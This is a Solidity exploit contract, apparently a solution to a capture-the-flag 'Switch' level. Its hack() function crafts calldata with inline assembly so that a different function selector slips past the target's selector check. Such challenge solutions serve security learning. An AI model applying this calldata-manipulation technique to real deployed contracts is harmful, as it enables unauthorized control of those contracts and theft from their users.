// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;
import "../../src/Switch/Switch.sol";
import "../BlockUtils.sol";
import "forge-std/console.sol";

contract SwitchExploit is BlockUtils {
    Switch victim;
    
    constructor(address _victim) {
        victim = Switch(payable(_victim));
    }

    function hack() public {
        bytes4 onSelector = bytes4(keccak256("turnSwitchOn()"));
        bytes4 offSelector = bytes4(keccak256("turnSwitchOff()"));
        bytes memory onData = abi.encodeWithSelector(onSelector);

        bytes memory payload = abi.encodeWithSelector(victim.flipSwitch.selector, onData);

        // Overwrite the 4 bytes at offset 100 to be offSelector
        assembly {
            mstore(add(payload, 100), offSelector)
        }

        (bool success, ) = address(victim).call(payload);
        require(success, "Call failed");
    }
}
